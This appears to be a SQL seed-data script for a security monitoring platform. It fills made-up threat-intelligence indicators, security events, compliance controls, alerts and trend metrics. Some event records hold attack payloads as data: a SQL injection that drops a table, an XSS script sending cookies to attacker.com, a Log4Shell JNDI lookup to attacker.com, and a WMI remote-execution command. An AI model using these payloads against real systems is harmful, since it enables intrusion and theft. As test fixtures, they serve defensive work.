-- NodeGuard AI Security Platform - Comprehensive Seed Data
-- Optional non-production fixtures for local evaluation.
-- This script deliberately creates no user accounts or credentials.

BEGIN;

-- ============================================
-- 1. THREAT INTELLIGENCE (25+ total)
-- ============================================
-- Clear duplicates first
DELETE FROM security.threat_intel WHERE indicator_value IN (
  '45.33.32.156', '198.51.100.42', '203.0.113.99', '172.16.254.1', '10.255.255.1',
  'zero-day-exploit.net', 'fake-antivirus-update.com', 'crypto-wallet-verify.io',
  'f3e4d5c6b7a8f3e4d5c6b7a8f3e4d5c6', 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4',
  'https://login-microsft-365.com/auth', 'https://drive-google-share.net/download',
  'https://aws-billing-update.com/verify', 'support@arnazon-orders.com', 'hr@gooogle-careers.net'
);

INSERT INTO security.threat_intel (indicator_type, indicator_value, threat_type, confidence_score, source, description, first_seen, last_seen, is_active) VALUES
-- Additional malicious IPs
('ip', '45.33.32.156', 'apt', 0.97, 'mandiant', 'APT29 (Cozy Bear) infrastructure - SolarWinds campaign', NOW() - INTERVAL '60 days', NOW() - INTERVAL '2 days', true),
('ip', '198.51.100.42', 'ransomware_c2', 0.93, 'crowdstrike', 'LockBit 3.0 ransomware command and control server', NOW() - INTERVAL '20 days', NOW() - INTERVAL '4 hours', true),
('ip', '203.0.113.99', 'cryptominer', 0.78, 'internal_detection', 'Cryptocurrency mining pool relay server', NOW() - INTERVAL '10 days', NOW() - INTERVAL '1 day', true),
('ip', '172.16.254.1', 'insider_threat', 0.82, 'ueba', 'Suspicious data staging server on internal network', NOW() - INTERVAL '5 days', NOW() - INTERVAL '3 hours', true),
('ip', '10.255.255.1', 'lateral_movement', 0.86, 'edr', 'Cobalt Strike beacon detected - lateral movement', NOW() - INTERVAL '3 days', NOW() - INTERVAL '1 hour', true),

-- Additional domains
('domain', 'zero-day-exploit.net', 'exploit_kit', 0.95, 'recorded_future', 'Hosting RIG exploit kit targeting browser vulnerabilities', NOW() - INTERVAL '15 days', NOW() - INTERVAL '6 hours', true),
('domain', 'fake-antivirus-update.com', 'social_engineering', 0.88, 'webroot', 'Distributing fake antivirus software bundled with RAT', NOW() - INTERVAL '8 days', NOW() - INTERVAL '12 hours', true),
('domain', 'crypto-wallet-verify.io', 'credential_theft', 0.91, 'chainanalysis', 'Cryptocurrency wallet phishing targeting MetaMask users', NOW() - INTERVAL '4 days', NOW() - INTERVAL '2 hours', true),

-- Additional hashes
('hash', 'f3e4d5c6b7a8f3e4d5c6b7a8f3e4d5c6', 'rootkit', 0.96, 'kaspersky', 'Equation Group rootkit variant - persistence mechanism', NOW() - INTERVAL '45 days', NOW() - INTERVAL '7 days', true),
('hash', 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4', 'wiper', 0.94, 'eset', 'HermeticWiper destructive malware sample', NOW() - INTERVAL '30 days', NOW() - INTERVAL '14 days', true),

-- Additional URLs
('url', 'https://login-microsft-365.com/auth', 'credential_theft', 0.93, 'proofpoint', 'Microsoft 365 credential phishing with MFA bypass', NOW() - INTERVAL '6 days', NOW() - INTERVAL '4 hours', true),
('url', 'https://drive-google-share.net/download', 'malware_delivery', 0.87, 'google_safe_browsing', 'Fake Google Drive sharing page delivering Emotet', NOW() - INTERVAL '3 days', NOW() - INTERVAL '1 hour', true),
('url', 'https://aws-billing-update.com/verify', 'phishing', 0.90, 'aws_abuse', 'AWS billing phishing targeting cloud administrators', NOW() - INTERVAL '2 days', NOW() - INTERVAL '30 minutes', true),

-- Additional emails
('email', 'support@arnazon-orders.com', 'phishing', 0.92, 'proofpoint', 'Amazon order confirmation phishing campaign', NOW() - INTERVAL '7 days', NOW() - INTERVAL '5 hours', true),
('email', 'hr@gooogle-careers.net', 'spear_phishing', 0.89, 'cofense', 'Targeted spear phishing impersonating Google HR', NOW() - INTERVAL '4 days', NOW() - INTERVAL '2 hours', true);

-- ============================================
-- 3. SECURITY EVENTS (25+ total)
-- ============================================
DELETE FROM security.events WHERE description IN (
  'Insider threat: unusual file access pattern on sensitive documents',
  'DDoS attack detected - volumetric UDP flood',
  'SQL injection attempt on customer portal',
  'Cross-site scripting (XSS) attempt on search endpoint',
  'API rate limit abuse from automated tool',
  'Cloud S3 bucket misconfiguration - public read access',
  'Lateral movement detected via WMI execution',
  'Supply chain compromise - malicious NPM package installed',
  'Credential stuffing attack on employee VPN portal',
  'Zero-day exploit attempt targeting Apache Log4j'
);

INSERT INTO security.events (event_type, severity, source_ip, destination_ip, user_id, endpoint, description, raw_data, ml_score, ai_analysis, status, created_at, updated_at) VALUES
('insider_threat', 'critical', '192.168.1.120', NULL, 'rjohnson', '/share/finance/q4-reports', 'Insider threat: unusual file access pattern on sensitive documents',
 '{"files_accessed": 847, "normal_daily": 12, "departments_crossed": 5, "after_hours": true, "usb_connected": true}',
 0.96, '{"risk_factors": ["volume_anomaly", "cross_department", "after_hours", "removable_media"], "user_risk_score": 0.94}', 'investigating', CURRENT_DATE + INTERVAL '2 hours', CURRENT_DATE + INTERVAL '2 hours'),

('ddos', 'critical', '0.0.0.0', '192.168.1.1', 'system', '/api/gateway', 'DDoS attack detected - volumetric UDP flood',
 '{"peak_bandwidth_gbps": 45.7, "packet_rate_mpps": 12.3, "attack_vectors": ["udp_flood", "dns_amplification"], "source_count": 15000}',
 0.99, '{"attack_classification": "volumetric_ddos", "mitigation_status": "auto_engaged", "estimated_botnet_size": 15000}', 'blocked', CURRENT_DATE + INTERVAL '3 hours', CURRENT_DATE + INTERVAL '3 hours'),

('sql_injection', 'high', '203.0.113.55', '192.168.1.50', 'anonymous', '/api/customers?id=1', 'SQL injection attempt on customer portal',
 '{"payload": "1 OR 1=1; DROP TABLE users;--", "parameter": "id", "waf_blocked": true, "request_method": "GET"}',
 0.91, '{"injection_type": "classic_sqli", "target_table": "customers", "waf_action": "blocked", "exploit_complexity": "low"}', 'blocked', CURRENT_DATE + INTERVAL '4 hours', CURRENT_DATE + INTERVAL '4 hours'),

('xss', 'high', '198.51.100.77', '192.168.1.50', 'anonymous', '/search?q=<script>alert(1)</script>', 'Cross-site scripting (XSS) attempt on search endpoint',
 '{"payload": "<script>document.location=attacker.com/?c=+document.cookie</script>", "type": "reflected", "encoded": false}',
 0.88, '{"xss_type": "reflected", "sanitization_bypassed": false, "csp_blocked": true}', 'blocked', CURRENT_DATE + INTERVAL '5 hours', CURRENT_DATE + INTERVAL '5 hours'),

('api_abuse', 'high', '10.0.0.200', '192.168.1.50', 'api_user_47', '/api/v2/data/export', 'API rate limit abuse from automated tool',
 '{"requests_per_minute": 5000, "rate_limit": 100, "api_key": "ak_***masked***", "data_volume_mb": 250}',
 0.83, '{"abuse_type": "rate_limit_bypass", "data_scraping_indicators": true, "api_key_compromised": "possible"}', 'investigating', CURRENT_DATE + INTERVAL '6 hours', CURRENT_DATE + INTERVAL '6 hours'),

('cloud_misconfig', 'critical', '192.168.1.200', NULL, 'devops_bot', 's3://company-backups', 'Cloud S3 bucket misconfiguration - public read access',
 '{"bucket": "company-backups", "acl": "public-read", "objects_exposed": 12450, "data_classification": "confidential", "region": "us-east-1"}',
 0.95, '{"exposure_risk": "critical", "data_types": ["database_backups", "config_files", "credentials"], "remediation": "immediate_acl_update"}', 'open', CURRENT_DATE + INTERVAL '7 hours', CURRENT_DATE + INTERVAL '7 hours'),

('lateral_movement', 'critical', '192.168.1.45', '192.168.1.100', 'compromised_svc', 'wmi', 'Lateral movement detected via WMI execution',
 '{"technique": "T1047", "source_host": "WS-045", "target_host": "SRV-100", "command": "wmic /node:SRV-100 process call create calc.exe", "credential_type": "ntlm_hash"}',
 0.93, '{"mitre_technique": "T1047 WMI", "kill_chain_phase": "lateral_movement", "attack_path": ["initial_access", "privilege_escalation", "lateral_movement"]}', 'investigating', CURRENT_DATE + INTERVAL '8 hours', CURRENT_DATE + INTERVAL '8 hours'),

('supply_chain', 'critical', '192.168.1.55', '104.16.0.0', 'ci_pipeline', '/node_modules/event-stream', 'Supply chain compromise - malicious NPM package installed',
 '{"package": "event-stream@3.3.6", "malicious_dep": "flatmap-stream", "target": "bitcoin_wallet", "pipeline": "production-build"}',
 0.97, '{"supply_chain_vector": "dependency_confusion", "package_compromised": true, "production_impact": "high"}', 'open', CURRENT_DATE + INTERVAL '9 hours', CURRENT_DATE + INTERVAL '9 hours'),

('credential_stuffing', 'high', '185.220.101.50', '192.168.1.5', 'multiple', '/vpn/login', 'Credential stuffing attack on employee VPN portal',
 '{"total_attempts": 45000, "unique_credentials": 12000, "successful_logins": 3, "source_proxy": "residential", "duration_hours": 4}',
 0.90, '{"attack_type": "credential_stuffing", "credential_source": "dark_web_dump", "compromised_accounts": ["user1@company.com", "user2@company.com", "user3@company.com"]}', 'investigating', CURRENT_DATE + INTERVAL '10 hours', CURRENT_DATE + INTERVAL '10 hours'),

('zero_day', 'critical', '198.51.100.100', '192.168.1.80', 'anonymous', '/api/log4j', 'Zero-day exploit attempt targeting Apache Log4j',
 '{"cve": "CVE-2021-44228", "payload": "${jndi:ldap://attacker.com/exploit}", "target_service": "java_webapp", "java_version": "11.0.12"}',
 0.98, '{"cve_id": "CVE-2021-44228", "cvss_score": 10.0, "exploit_success": false, "patched": true}', 'blocked', CURRENT_DATE + INTERVAL '11 hours', CURRENT_DATE + INTERVAL '11 hours');

-- ============================================
-- 4. COMPLIANCE CONTROLS TABLE (20+ controls)
-- ============================================
CREATE TABLE IF NOT EXISTS security.compliance_controls (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    framework VARCHAR(50) NOT NULL,
    control_id VARCHAR(50) NOT NULL,
    title VARCHAR(255) NOT NULL,
    description TEXT,
    category VARCHAR(100),
    status VARCHAR(20) DEFAULT 'not_tested',
    severity VARCHAR(20) DEFAULT 'medium',
    last_tested TIMESTAMP,
    evidence TEXT[],
    remediation TEXT,
    owner VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_compliance_controls_framework ON security.compliance_controls(framework);
CREATE INDEX IF NOT EXISTS idx_compliance_controls_status ON security.compliance_controls(status);

DELETE FROM security.compliance_controls;

INSERT INTO security.compliance_controls (framework, control_id, title, description, category, status, severity, last_tested, evidence, remediation, owner) VALUES
-- GDPR Controls
('GDPR', 'GDPR-5.1', 'Lawfulness of Processing', 'Ensure all personal data processing has a lawful basis', 'Data Protection Principles', 'passed', 'high', NOW() - INTERVAL '3 days', ARRAY['Privacy impact assessment completed', 'Legal basis documented for all processing activities'], 'Review processing activities quarterly', 'Legal Team'),
('GDPR', 'GDPR-6.1', 'Consent Management', 'Implement proper consent collection and management', 'Consent', 'passed', 'high', NOW() - INTERVAL '5 days', ARRAY['Consent management platform active', 'Double opt-in enabled'], 'Update consent forms annually', 'Privacy Officer'),
('GDPR', 'GDPR-17.1', 'Right to Erasure', 'Implement data subject erasure requests within 30 days', 'Data Subject Rights', 'warning', 'critical', NOW() - INTERVAL '2 days', ARRAY['Erasure process documented', '95% requests fulfilled within SLA'], 'Automate erasure pipeline', 'Data Engineering'),
('GDPR', 'GDPR-33.1', 'Breach Notification', 'Notify supervisory authority within 72 hours of breach', 'Breach Management', 'passed', 'critical', NOW() - INTERVAL '1 day', ARRAY['Incident response plan tested', 'Notification templates ready'], 'Conduct annual breach simulation', 'CISO'),

-- ISO 27001 Controls
('ISO27001', 'A.5.1', 'Information Security Policies', 'Establish and review information security policies', 'Organizational Controls', 'passed', 'high', NOW() - INTERVAL '7 days', ARRAY['Policy document v3.2 approved', 'Annual review completed'], 'Schedule next review', 'CISO'),
('ISO27001', 'A.8.1', 'Asset Management', 'Maintain inventory of all information assets', 'Asset Management', 'warning', 'medium', NOW() - INTERVAL '4 days', ARRAY['CMDB 92% complete', 'Shadow IT discovered in 3 departments'], 'Complete CMDB audit', 'IT Operations'),
('ISO27001', 'A.9.1', 'Access Control Policy', 'Implement role-based access control', 'Access Control', 'passed', 'critical', NOW() - INTERVAL '2 days', ARRAY['RBAC implemented across all systems', 'Quarterly access reviews completed'], 'Implement zero-trust model', 'IAM Team'),
('ISO27001', 'A.12.1', 'Operational Security', 'Document operating procedures for information processing', 'Operations Security', 'passed', 'medium', NOW() - INTERVAL '6 days', ARRAY['SOPs documented', 'Change management process active'], 'Update SOPs quarterly', 'IT Operations'),

-- NIST Controls
('NIST', 'ID.AM-1', 'Physical Device Inventory', 'Maintain inventory of physical devices and systems', 'Identify - Asset Management', 'passed', 'medium', NOW() - INTERVAL '3 days', ARRAY['Device inventory automated via SNMP', '1,247 devices tracked'], 'Add IoT device scanning', 'IT Operations'),
('NIST', 'PR.AC-1', 'Identity Management', 'Manage identities and credentials for authorized devices and users', 'Protect - Access Control', 'passed', 'high', NOW() - INTERVAL '1 day', ARRAY['SSO implemented', 'MFA enforced for all admin accounts'], 'Extend MFA to all users', 'IAM Team'),
('NIST', 'DE.CM-1', 'Network Monitoring', 'Monitor network for cybersecurity events', 'Detect - Continuous Monitoring', 'passed', 'critical', NOW() - INTERVAL '1 day', ARRAY['SIEM operational 24/7', 'NDR deployed at all egress points'], 'Add encrypted traffic inspection', 'SOC Team'),
('NIST', 'RS.RP-1', 'Incident Response Plan', 'Execute incident response plan during or after an incident', 'Respond - Response Planning', 'warning', 'critical', NOW() - INTERVAL '5 days', ARRAY['IR plan documented', 'Last tabletop exercise 4 months ago'], 'Schedule quarterly tabletop exercises', 'IR Team'),

-- PCI DSS Controls
('PCI-DSS', 'PCI-1.1', 'Firewall Configuration', 'Install and maintain firewall configuration to protect cardholder data', 'Network Security', 'passed', 'critical', NOW() - INTERVAL '2 days', ARRAY['Firewall rules reviewed', 'Segmentation testing passed'], 'Automate rule review', 'Network Team'),
('PCI-DSS', 'PCI-3.4', 'Data Encryption', 'Render PAN unreadable anywhere it is stored', 'Data Protection', 'passed', 'critical', NOW() - INTERVAL '1 day', ARRAY['AES-256 encryption verified', 'Key rotation automated'], 'Implement tokenization', 'Security Engineering'),
('PCI-DSS', 'PCI-6.1', 'Vulnerability Management', 'Identify and classify vulnerabilities', 'Vulnerability Management', 'warning', 'high', NOW() - INTERVAL '3 days', ARRAY['Weekly vulnerability scans', '15 high-severity findings pending'], 'Reduce remediation SLA to 7 days', 'Vulnerability Team'),
('PCI-DSS', 'PCI-10.1', 'Audit Trail', 'Implement audit trails to link access to individual users', 'Logging and Monitoring', 'passed', 'high', NOW() - INTERVAL '2 days', ARRAY['Centralized logging active', 'Log retention: 12 months'], 'Extend retention to 24 months', 'SOC Team'),

-- HIPAA Controls
('HIPAA', 'HIPAA-164.312a', 'Access Control', 'Implement technical policies for electronic information systems with ePHI', 'Technical Safeguards', 'failed', 'critical', NOW() - INTERVAL '4 days', ARRAY['Access review incomplete', 'Shared accounts found in 2 systems'], 'Eliminate shared accounts, complete access review', 'IAM Team'),
('HIPAA', 'HIPAA-164.312c', 'Integrity Controls', 'Implement policies to protect ePHI from improper alteration', 'Technical Safeguards', 'passed', 'high', NOW() - INTERVAL '2 days', ARRAY['Data integrity checks automated', 'Hash verification on all transfers'], 'Add real-time integrity monitoring', 'Data Engineering'),
('HIPAA', 'HIPAA-164.312e', 'Transmission Security', 'Implement measures to guard against unauthorized access during transmission', 'Technical Safeguards', 'passed', 'critical', NOW() - INTERVAL '1 day', ARRAY['TLS 1.3 enforced', 'Certificate pinning implemented'], 'Monitor for certificate anomalies', 'Network Team'),

-- SOX Controls
('SOX', 'SOX-302', 'CEO/CFO Certification', 'Certify financial reporting controls effectiveness', 'Management Assessment', 'passed', 'critical', NOW() - INTERVAL '30 days', ARRAY['Q3 certification completed', 'No material weaknesses identified'], 'Prepare Q4 certification', 'Finance Team'),
('SOX', 'SOX-404', 'Internal Controls Assessment', 'Assess effectiveness of internal controls over financial reporting', 'Internal Controls', 'warning', 'critical', NOW() - INTERVAL '14 days', ARRAY['Assessment 80% complete', '2 significant deficiencies identified'], 'Remediate deficiencies before year-end', 'Internal Audit');

-- ============================================
-- 5. ALERTS TABLE (15+ alerts)
-- ============================================
CREATE TABLE IF NOT EXISTS security.alerts (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    title VARCHAR(255) NOT NULL,
    description TEXT,
    severity VARCHAR(20) NOT NULL DEFAULT 'medium',
    status VARCHAR(20) NOT NULL DEFAULT 'new',
    source VARCHAR(100),
    event_id UUID REFERENCES security.events(id),
    assigned_to UUID REFERENCES users(id),
    acknowledged_at TIMESTAMP,
    resolved_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_alerts_severity ON security.alerts(severity);
CREATE INDEX IF NOT EXISTS idx_alerts_status ON security.alerts(status);
CREATE INDEX IF NOT EXISTS idx_alerts_created_at ON security.alerts(created_at);

DELETE FROM security.alerts;

INSERT INTO security.alerts (title, description, severity, status, source, created_at) VALUES
('Critical: Ransomware Detected on Endpoint', 'WannaCry variant detected on workstation WS-045. Immediate isolation recommended.', 'critical', 'new', 'edr', NOW() - INTERVAL '1 hour'),
('Critical: Data Exfiltration Attempt', 'Large data transfer (2GB+) to known malicious IP 45.142.214.219 detected.', 'critical', 'investigating', 'dlp', NOW() - INTERVAL '2 hours'),
('Critical: DDoS Attack in Progress', 'Volumetric DDoS attack detected at 45.7 Gbps. Auto-mitigation engaged.', 'critical', 'mitigated', 'ddos_protection', NOW() - INTERVAL '3 hours'),
('High: Admin Login from Tor Exit Node', 'Admin account login detected from known Tor exit node IP.', 'high', 'investigating', 'siem', NOW() - INTERVAL '4 hours'),
('High: DNS Tunneling Detected', 'Possible DNS tunneling to malicious-c2.com with 847 unique subdomains.', 'high', 'new', 'ndr', NOW() - INTERVAL '5 hours'),
('High: Supply Chain Package Compromise', 'Malicious NPM package event-stream@3.3.6 detected in production build pipeline.', 'high', 'new', 'sca', NOW() - INTERVAL '6 hours'),
('High: Credential Stuffing Attack', '45,000 login attempts on VPN portal. 3 successful compromises identified.', 'high', 'investigating', 'waf', NOW() - INTERVAL '7 hours'),
('Medium: Failed Login Threshold Exceeded', 'User bthomas exceeded failed login threshold (8 attempts in 10 minutes).', 'medium', 'acknowledged', 'iam', NOW() - INTERVAL '8 hours'),
('Medium: Unauthorized API Rate Limit Bypass', 'API user api_user_47 making 5,000 req/min (limit: 100). Data scraping suspected.', 'medium', 'investigating', 'api_gateway', NOW() - INTERVAL '9 hours'),
('Medium: Cloud Storage Misconfiguration', 'S3 bucket company-backups found with public-read ACL. 12,450 objects exposed.', 'medium', 'new', 'cspm', NOW() - INTERVAL '10 hours'),
('Medium: Suspicious File Integrity Change', 'Critical system file /etc/passwd modified outside of change window.', 'medium', 'acknowledged', 'fim', NOW() - INTERVAL '11 hours'),
('Low: Authorized Vulnerability Scan Detected', 'Nessus scanner nessus_01 conducting authorized weekly vulnerability scan.', 'low', 'resolved', 'ids', NOW() - INTERVAL '12 hours'),
('Low: System Update Completed', '15 updates installed including 8 security patches. Reboot required.', 'low', 'resolved', 'patch_management', NOW() - INTERVAL '13 hours'),
('High: Lateral Movement via WMI', 'WMI remote execution detected from WS-045 to SRV-100 using NTLM hash.', 'high', 'investigating', 'edr', NOW() - INTERVAL '14 hours'),
('Critical: Zero-Day Exploit Attempt', 'Log4Shell (CVE-2021-44228) exploit attempt detected and blocked.', 'critical', 'blocked', 'waf', NOW() - INTERVAL '15 hours'),
('Medium: Policy Violation - Web Filter', 'User kjohnson attempted to access phishing domain secure-bank-update.tk.', 'medium', 'resolved', 'web_proxy', NOW() - INTERVAL '16 hours');

-- ============================================
-- 6. ANALYTICS - 30 DAYS TREND DATA
-- ============================================
DELETE FROM analytics.metrics WHERE metric_name = 'daily_event_count' OR metric_name = 'daily_alert_count' OR metric_name = 'daily_threat_intel_updates';

INSERT INTO analytics.metrics (metric_name, metric_value, metric_type, tags, timestamp)
SELECT
    'daily_event_count',
    (15 + floor(random() * 60))::numeric,
    'count',
    json_build_object('date', (CURRENT_DATE - (n || ' days')::interval)::date::text, 'category', 'security_events')::jsonb,
    CURRENT_DATE - (n || ' days')::interval
FROM generate_series(0, 29) AS n;

INSERT INTO analytics.metrics (metric_name, metric_value, metric_type, tags, timestamp)
SELECT
    'daily_alert_count',
    (5 + floor(random() * 25))::numeric,
    'count',
    json_build_object('date', (CURRENT_DATE - (n || ' days')::interval)::date::text, 'category', 'alerts')::jsonb,
    CURRENT_DATE - (n || ' days')::interval
FROM generate_series(0, 29) AS n;

INSERT INTO analytics.metrics (metric_name, metric_value, metric_type, tags, timestamp)
SELECT
    'daily_threat_intel_updates',
    (2 + floor(random() * 15))::numeric,
    'count',
    json_build_object('date', (CURRENT_DATE - (n || ' days')::interval)::date::text, 'category', 'threat_intel')::jsonb,
    CURRENT_DATE - (n || ' days')::interval
FROM generate_series(0, 29) AS n;

-- Grant permissions on new tables
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA security TO nodeguard;
GRANT ALL PRIVILEGES ON ALL SEQUENCES IN SCHEMA security TO nodeguard;

COMMIT;
